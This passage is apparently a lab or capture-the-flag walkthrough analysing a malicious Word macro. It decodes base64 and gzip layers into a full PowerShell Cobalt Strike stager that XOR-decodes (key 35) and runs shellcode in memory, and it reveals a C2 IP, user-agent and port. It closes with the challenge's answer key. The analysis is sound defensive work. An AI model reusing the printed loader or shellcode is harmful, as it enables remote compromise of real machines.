|                   | TwB0AFMAaQBrAFkAVwBWAGkAd |                |
|                   | gBVAHEAdwBUAG0AcABjAGwATg |                |
|                   | BpAEoAdQBQAGkAegArADQANgA |                |
|                   | 0AFUAVwBjAFQAVQBVAEUAaQB1 |                |
|                   | ADUAbAA3AEsAbgAwAEIANgAyA |                |
|                   | GIAcgByAE8AbgBCAGkASQBnAD |                |
|                   | IAeQBDAHoAQQBzAEYAQQA5AHI |                |
|                   | ASgByAEkAeQBWAEsAcgBVAHcA |                |
|                   | TgBRAHgAbAB5AHIAbQA3AHUAc |                |
|                   | ABDADgAVgBOAE0AdQBzAGkAeQ |                |
|                   | A0AE0AaQBCAHAAUgBoAHkAQQB |                |
|                   | qAE0AWgBGAGcAcgBKAE8AQgBQ |                |
|                   | AG8AMQBYAC8AbgBSADcAbQBtA |                |
|                   | FkAQwBMAGEAbgBvAFYAdABrAE |                |
|                   | 0ANgByAGsARwBDAGgASABkAFM |                |
|                   | AYwB5ADQAbgBLADYAWQBaADIA |                |
|                   | VwBDAC8AKwBCADcAZQB2ADUAK |                |
|                   | wBSADgASwBEAEsAcwByAGkAQg |                |
|                   | A5AGMAQgBvAEkAbwBGAGcAdQB |                |
|                   | xAFYASQByAE0AeQBCAFEAMQA0 |                |
|                   | AHIAVgBuADQAagAzAHYANwBuA |                |
|                   | DMAWQA0AG4ANQB3AGMAMQB1AG |                |
|                   | cAQwArAEoATABPAFUASAA4AFo |                |
|                   | AbABMAFMAWABaAGMAYwBrAGsA |                |
|                   | dAB1ADEAeQArAHYAbQBPAFoAS |                |
|                   | QB4AGMAUQBRAEUAMABJAFgASg |                |
|                   | B0AEQASQBXADQAMwBsAGIAeQB |                |
|                   | NAGwAWQByAE0AWQArAFMATABx |                |
|                   | AFgAUwBZAHQAWQBNACsASAB3A |                |
|                   | HMARABmADgAQQB2ADQASQBuAG |                |
|                   | gAWQBYAHkAQgBIADQAKwBIAGM |                |
|                   | ANAArAGIAagB6AFUAKwBtAGsA |                |
|                   | dwBIADkATgBBAFEAWgA0ACsAO |                |
|                   | QBaAHAAUgBFAFkAcgBUAGcAYQ |                |
|                   | BFAGEAZwBRAGUANwBOADcALwB |                |
|                   | PAEcARwBFAC8AYwBwADMAcABr |                |
|                   | AE4AKwB1ADYASgA4AFkAeQB6A |                |
|                   | EkAVQBQAC8AaQBEAHMAaQBYAE |                |
|                   | cAUABIAFQAUgA4AFYAMgBqAHY |                |
|                   | AegBNADcARgB6AGwAbAAvAHAA |                |
|                   | aQBaADEAZABTAE0ASwBEADIAc |                |
|                   | ABmAGEAQQA1AFcAbwBaAEQASg |                |
|                   | BEADgAUwBZAEUALwB4AHUAeAA |                |
|                   | 0AFgAeAB2AFIAaAAzADMAUwBI |                |
|                   | AG8AUABiAFkAOQBoADAAdgAwA |                |
|                   | EoAdQBhAEgAYgBiAHcAWgBhAH |                |
|                   | cAbABEAEgAagBIAGEAbgBkAEw |                |
|                   | AUgBxAHEATABRADkAZgA0AHEA |                |
|                   | bABjAGMAcgAzAHAATQBWAFIAe |                |
|                   | AArAHIAOQBaAGsAdwBsAE4AOA |                |
|                   | BhAFAARABuAFIAKwBtAEIATwA |                |
|                   | 2ADMAeQA0ADEAVgBjACsAegAw |                |
|                   | AHoAVgBrAFEAZAB4AGkAcwB4A |                |
|                   | E8AYQBUAHYARABWAEYARwA0AF |                |
|                   | YARAB0AEcAYgA5AE8AdQBkAE4 |                |
|                   | AQQBHADgAbABnAGYAKwBZADgA |                |
|                   | dAAvAGEAMgBSAEMAbgBJAFQAY |                |
|                   | wBEAGcAcABxAGIAUwBmAHQAZg |                |
|                   | BXAFQAdABoAEUAUwBiAFMATwB |                |
|                   | QADAAOABHAFQAMwBBAGUANwBm |                |
|                   | AHIAVABlAE4AUQBlAFMAdwBvA |                |
|                   | EIAdABSAFQAOABsACsAagBLAG |                |
|                   | MARABCAGYAawBpAFoAawBpAHU |                |
|                   | ANQBtAG0AVAByAE0AcgBIAHMA |                |
|                   | VABUAFcAUABQAEkAYQBqAE4Ac |                |
|                   | wBCAHkAagB0AGUAbQBNAFQAcQ |                |
|                   | A1AHgAQgBNAHQAMwBoAGUATAB |                |
|                   | zAGIAZABuAGgAeQA5AGsAOQBS |                |
|                   | ADUAcQBrAE8AdABxADMAQgBvA |                |
|                   | GoAYwBDADIAMAA1AFgAawBpAE |                |
|                   | EAWABxAEMAWABnAEoAYwBpAE0 |                |
|                   | AUQBoAE4AcwBQAFEAYQArAGEA |                |
|                   | RQBxAEgAdABIADMAUQBHAEQAb |                |
|                   | QBSAE4ATgA2AEsATgBHAFYAYQ |                |
|                   | BDAFcAYwBwAE0AOQB1ADIATgB |                |
|                   | iAFIATgBlADEATwBXAFYAVQBl |                |
|                   | AGoAdwBUAEYAeABIAHcAUABQA |                |
|                   | DkAOQB2AEgANwB0AE0AbQBsAF |                |
|                   | QAdgBpAGwASwA3AGcAVgBiAGg |                |
|                   | AdAB6AHAATgBPAEoAMwA2AG8A |                |
|                   | dAA3AG0ATgA5ADkAaABOAFYAO |                |
|                   | ABhAHEAVwBUACsARQBnAHUAYg |                |
|                   | BlADcANwBYADcASgB1AEgAYQA |                |
|                   | 0AFoANwBUACsAdQB6AFMAUABN |                |
|                   | ADQAYQBpAC8AMABZADcAUgA0A |                |
|                   | DIAOQBwAHYASQBiAEcAZAB6AG |                |
|                   | kANQA4ADgASABlAGYAOQB4AFU |                |
|                   | AcgBiAHMAbwAyAFcAdABGADUA |                |
|                   | NgAwAHcAVQB0AFMAawBKAEMAT |                |
|                   | AA5AGkARQBzAEEAdQArAHQAWg |                |
|                   | BoAFoAKwBtAGkAMgA3AFAAVAA |                |
|                   | 3AHIAQgB4AHAAZgBjADkAbQBU |                |
|                   | ADYASABNAG4AMwBZADkASABmA |                |
|                   | EkAeABwADAALwBMAEoAUwBzAF |                |
|                   | QAUABaAEgAVwB2AGIAbgA0AHg |                |
|                   | ARABMADYAWABEAG4AcQBtAGIA |                |
|                   | MwBjAFIAcAArAFYAWgBIAFcAO |                |
|                   | QBaAGQAZwBHAEYAMgBzAHoAYQ |                |
|                   | BkADYAYgBTADcASwB3AGwANQB |                |
|                   | iADgAZgBEAFkAYQBtADgAZgBE |                |
|                   | AGsAOQBIAG4ARgBpAHUARgBuA |                |
|                   | C8ASAAzADkAbgAxAEwATgAxAH |                |
|                   | IAMwBoAHQAYwA5AEMASABIAHo |                |
|                   | AbgByAFYAWgBKADAAWgAxAHMA |                |
|                   | NQBKADAAVgBOAHUAKwBmADIAa |                |
|                   | gB2AHUAQwBXAHoAVwB3AFoAcg |                |
|                   | BtAGYAZQBUAEoAUgBUAEgAZAB |                |
|                   | HAEcAZABqAEEAZQByADAAeABy |                |
|                   | AEYASgBwAHIAdQAyAC8AUABPA |                |
|                   | FEAZQBWAFgAWAB0AHcAUQBKAE |                |
|                   | gAbwBtAGUAWQByADkARwBEAC8 |                |
|                   | ATQBrAFMASAB2AE8ARwA0AHQA |                |
|                   | VABmAGMASABvADgARgAxAFQAM |                |
|                   | gA5AG0AMwAyADUAQgBlAGIAbA |                |
|                   | BuAHAAUQBSAFgAVQB0ACsAUgB |                |
|                   | 1AGcATQBoAFUAdgB2AHQAbABo |                |
|                   | AEoASQBSAG8AZgBWAGUAZwA4A |                |
|                   | FQAZABEAEEAYgBpAHEAMAB2AD |                |
|                   | cAZgBVAG0AawBPAGwAVwB4AGQ |                |
|                   | AZwBOAGoAcgBQAEoAawBDAEYA |                |
|                   | dgBLAGEATAA1AEoAYgA5ADEAa |                |
|                   | gBVAHAAbwA4AFAANQBoADMARw |                |
|                   | BwAHQAagBIAHUATQBoAHMASgB |                |
|                   | oAHcAOQBVADMAawA5AFcARQA3 |                |
|                   | AGYAZwB6AHQAeAAzAHYAcABXA |                |
|                   | EIAeQBhAEEANgBPAFgATABTAF |                |
|                   | AASgBrAG4ARgAwAFcASQBqAFg |                |
|                   | AcwA5AHAAUQAwAEwAcQAwADIA |                |
|                   | QwA2AE4AdwBiAE4AKwBrAFIAd |                |
|                   | wBMAFYATwBLAGgARwBhAEYANA |                |
|                   | A3AFoAYQBYAFcARwBTAFIARwA |                |
|                   | 3AEsAdQAyADEAWABIAHQATQB0 |                |
|                   | AHgATwBuAEEAVQAyAFUAdABqA |                |
|                   | DgAVQAzADQARABNAGQASABzAF |                |
|                   | MARwBkAE4AQgA1ADgAcgBCAG4 |                |
|                   | AZQBuADMAZwBZAFcASQBEAFgA |                |
|                   | NABCAEgAWgBzAFUAWgBKAG4AN |                |
|                   | ABJAFAARQAyAGwAbgBwAGoASw |                |
|                   | BHAFYAZABQAEIAQQBWAGMAegB |                |
|                   | 0AFcANgBZAGYAbgBkAG0AZABr |                |
|                   | AGMAcQBRAGYAZwB5AEUATgBUA |                |
|                   | GkAawBZAFEAaABNAGIAdgBaAH |                |
|                   | kAdgBJADEAWQBKAG4ANgBiAFU |                |
|                   | AdwBvADkAWAArAHgAVgBaAFcA |                |
|                   | agBRAHcAMwBnAFAANwBpAGwAT |                |
|                   | gAzAFoALwA2AEwAZwAvADgANA |                |
|                   | BpADEASAB1ADkAZwBTAG8ARAB |                |
|                   | CAFMAeQBiAHIAMQBUAEsAMgBi |                |
|                   | ADMALwB2AHYASgA4AGUAMwBxA |                |
|                   | DUAOQBtAG4AdgA3ADMAZgBxAE |                |
|                   | MAYQB3AHgAcgBhAHgAMgA1AFM |                |
|                   | AcwB4ACsAbABDAHgAZgB0AFgA |                |
|                   | OABTAEMAZwBJADkAOABpAEMAU |                |
|                   | wBnAFkATgB6AFAAWAA2AEUAZA |                |
|                   | B4AEEAdQBMAFEAaABVADkAZgB |                |
|                   | NAE4ARQBxAGwAegB6AHYAbgBJ |                |
|                   | AHcANABjAGIARQBGAFgAQwBYA |                |
|                   | DMAbgB0AFcAaQB6AGwAdQBWAH |                |
|                   | EAVwBlAFAAMABpAHcANABHADI |                |
|                   | AcgBoAHoAYwAvAFUAQwBsADkA |                |
|                   | TQBTAGgAawB6AGoAMAAxAEcAW |                |
|                   | gBlAGgAZQBFAGIAdQBrAGMAaw |                |
|                   | B4AG8AWgBSAHQANQBjAFgAQwB |                |
|                   | LADgAOQBsAGgAWAB3AFMAOQBm |                |
|                   | AHQAaABCAGUAOQBRAE8ASQBZA |                |
|                   | CsAegBzAHkATAA1AEsAMABTAG |                |
|                   | UARwBwAHUAbgBzAHYAMABtAFg |                |
|                   | AQwA3ADgAUABTADkAZgAxADAA |                |
|                   | dABLADcAdQBXAHIAVwBYAEgAM |                |
|                   | wB3ADUATwBOAE8AVgByADUAVA |                |
|                   | ArAFkASgArAEUARABrADIALwB |                |
|                   | qADgAbQA0AEkAZABOAC8AegB1 |                |
|                   | ADAARwBYAGgANQBmAC8AWQBPA |                |
|                   | FgAZQA3AFEANQAzAGkAVgBDAD |                |
|                   | gAVQAvAEMAZwBYAFIAbwBEADc |                |
|                   | ATQBoACsAWQBiAGYASAAxAGcA |                |
|                   | bgAzAHIATQB1AFIAYwBDAHoAY |                |
|                   | wBuAGQAdwBWAFgAaABVAHkAVw |                |
|                   | AvAGUAMAB1ADMAcQBFAHkASgA |                |
|                   | vAEkAYQA2AFIAZABSADMANgBn |                |
|                   | ADcAQwBZADAATwBtAEEAZAA4A |                |
|                   | HIAdwBTADcASwBMAG0ATABxAC |                |
|                   | 8AUABuADEAagBVAHEAUQBlAFY |                |
|                   | AYgA4AFIAcwAyAHgAaABxAEYA |                |
|                   | OQB2AGgAdQA2AEsAcgBBAFUAU |                |
|                   | QB6ACsAVgBtAGMANgBOAFoATQ |                |
|                   | BJAHcAOQB6AGUAVQBZADgARgB |                |
|                   | rAHoAdwAwAEEAQQBBAD0APQAi |                |
|                   | ACkAKQA7AEkARQBYACAAKABOA |                |
|                   | GUAdwAtAE8AYgBqAGUAYwB0AC |                |
|                   | AASQBPAC4AUwB0AHIAZQBhAG0 |                |
|                   | AUgBlAGEAZABlAHIAKABOAGUA |                |
|                   | dwAtAE8AYgBqAGUAYwB0ACAAS |                |
|                   | QBPAC4AQwBvAG0AcAByAGUAcw |                |
|                   | BzAGkAbwBuAC4ARwB6AGkAcAB |                |
|                   | TAHQAcgBlAGEAbQAoACQAcwAs |                |
|                   | AFsASQBPAC4AQwBvAG0AcAByA |                |
|                   | GUAcwBzAGkAbwBuAC4AQwBvAG |                |
|                   | 0AcAByAGUAcwBzAGkAbwBuAE0 |                |
|                   | AbwBkAGUAXQA6ADoARABlAGMA |                |
|                   | bwBtAHAAcgBlAHMAcwApACkAK |                |
|                   | QAuAFIAZQBhAGQAVABvAEUAbg |                |
|                   | BkACgAKQA7A               |                |
| Found Entry Point | squidgame_click           |                |
| Found Entry Point | SquidGame_Click           |                |
| Found Entry Point | CatchMeIfYouCan_Click     |                |
| Found Entry Point | catchmeifyoucan_click     |                |
+-------------------+---------------------------+----------------+

INFO     Found 2 possible IOCs. Stripping duplicates...
VBA Builtins Called: ['Shell']

Finished analyzing attacker5.doc .

```

So we have some obfuscated powershell

We can use cyberchef again to deobfuscate it. It is encoded with Base64, then we can remove null bytes.

SS17

We can then take the compressed B64 string from that
```text
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
```

we also see that at the end of the output:

```text
(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
```

It is using Gzip

So we can use cyberchef again using from B64 and Gunzip

SS18

and we get the output:

```text
Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_gpa = $var_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'string'))
	return $var_gpa.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')

	return $var_type_builder.CreateType()
}

[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSByckuzPCMjcHNLdKq85dz2yFN4EvFxSyMhQ6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMcElucSP+sQy3QZ6caZyDPAAbKKHkwo8rpqq6kCYXyN9IP0+eVsZ4Rw99v716BXp8CyVfV41jsFco/hc/4tB6shBcGAUikQ2ThLag7XmzI3ZQRlEOYkRGTVcZA25MWUpPT0IMFw0TAwtATE5TQldKQU9GGANucGpmAxsNExgDdEpNR0xUUANtdwMWDRIYA3dRSkdGTVcMFw0TGAMNbWZ3A2BvcQMRDRMNFhMUERQKLikjYfGBTVSEQE/m/5df5/fpCjFv4/AmAnva1i+w9bmm/76gBU3gUrWNEqwUDynyTlxf7l95KviaPh6R9jbEVpv2FM0QMpSm8v7RafNgBBWMPhjf2BCxziGm5ons/AMwe+yqnMCHFubG65SrMf9AcD7Oaji2SmdUmWXrN05+fgHkQOJ3tzya0EUEZof+sfEqjL55Xf/eaJFjXB1XOVOA9qQo6vhMrOj4HkBuhuOw+ncvfvWR0fMabYHPhfH41OFoliMuF4+BBZc1S3wwN4NgZCNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEhQVDRITEA0WFQ0bGiMjIyMi')

for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 35
}

$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
$var_runme.Invoke([IntPtr]::Zero)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
	IEX $DoIt
}

```

and we can take this part of it:

```text
38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSByckuzPCMjcHNLdKq85dz2yFN4EvFxSyMhQ6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMcElucSP+sQy3QZ6caZyDPAAbKKHkwo8rpqq6kCYXyN9IP0+eVsZ4Rw99v716BXp8CyVfV41jsFco/hc/4tB6shBcGAUikQ2ThLag7XmzI3ZQRlEOYkRGTVcZA25MWUpPT0IMFw0TAwtATE5TQldKQU9GGANucGpmAxsNExgDdEpNR0xUUANtdwMWDRIYA3dRSkdGTVcMFw0TGAMNbWZ3A2BvcQMRDRMNFhMUERQKLikjYfGBTVSEQE/m/5df5/fpCjFv4/AmAnva1i+w9bmm/76gBU3gUrWNEqwUDynyTlxf7l95KviaPh6R9jbEVpv2FM0QMpSm8v7RafNgBBWMPhjf2BCxziGm5ons/AMwe+yqnMCHFubG65SrMf9AcD7Oaji2SmdUmWXrN05+fgHkQOJ3tzya0EUEZof+sfEqjL55Xf/eaJFjXB1XOVOA9qQo6vhMrOj4HkBuhuOw+ncvfvWR0fMabYHPhfH41OFoliMuF4+BBZc1S3wwN4NgZCNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEhQVDRITEA0WFQ0bGiMjIyMi
```

Which is another B64 script.

We also see
```text
for ($x = 0; $x -lt $var_code.Count; $x++) {
	$var_code[$x] = $var_code[$x] -bxor 35
}
```

So we know XOR was used to encrypt it further with the key of 35

The output is as follows:

```text
üè`å1ÒdR0RRr(·J&1ÿ1À¬<a|, ÁÏ
ÇâðRWRB<Ð@xÀtJÐPHX Óã<I4Ö1ÿ1À¬ÁÏ
Ç8àuô}ø;}$uâXX$ÓfKXÓÐD$$[[aYZQÿàX_Zë]hnethwiniThLw&ÿÕ1ÿWWWWWh:Vy§ÿÕé[1ÉQQjQQhSPhWÆÿÕëp[1ÒRh`RRRSRPhëU.;ÿÕÆÃP1ÿWWjÿSVh-{ÿÕÀÃ1ÿötùë	hªÅâ]ÿÕÁhE!^1ÿÕ1ÿWjQVPh·WàÿÕ¿/9Çt·1ÿééÉèÿÿÿ/SjMRÝ/b½¿J¿ #8Çá¬³4ëükl½uå[d,^Y&Y_(|t®@tÝ4ÁóY3;&².°§ÎZUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)
BÒ¢nw§clÅÜ´|ÄÔÊ)LÀÓ!XùõÖÜ&nÃq®17,
Ñm|Í|Z	Û¹=²Õçu¸Õ7î3·ÑÝòJÐC'6¯;üû3íÅªÏß XÏ¿ã¤5ÅåÈ·ÜcSíIiDwºFÈm]]"ÇcÁT¹óf'E¤ÝÒ	¯Z~ÜýK²@>tp£ÕÉÛoËÛ=cM¥ÀÙT]Ö²òÐ9N¢ì¦ÒÛ÷ÂKµ
4¬¢&´h_ CGhðµ¢VÿÕj@hh@WhX¤SåÿÕ¹ÙQSçWh SVhâÿÕÀtÆÃÀuåXÃè©ýÿÿ176.103.56.89
```

SS19

```text
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)
```

```text
176.103.56.89
```

This is the only piece that makes sense. We can see this is packed shellcode so we can download it from cyberchef (download.dat)

We can use `scdbgc` to debug the shellcode

```shell
scdbgc /f '/home/ubuntu/Downloads/download.dat' -s -1
```

This uncovers the server IP address and port, which are associated with the Cobalt Strike C2 Server

We can also run

```shell
`scdbgc /f ~/Downloads/download1.dat /s -1`
```

Which specifies unlimited steps during execution.

This reveals the path value along with the first two API names. 

---

Q: What is the caption you found in the maldoc?

A: CobaltStrikeIsEverywhere

Q: What is the XOR decimal value found in the decoded-base64 script?

A: 35

Q: Provide the C2 IP address of the Cobalt Strike server.

A: 176.103.56.89

Q: Provide the full user-agent found.

A: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727)

Q: Provide the path value for the Cobalt Strike shellcode.

A: /SjMR

Q: Provide the port number of the Cobalt Strike C2 Server.

A: 8080

Q: Provide the first two APIs found.

A: LoadLibraryA, InternetOpenA
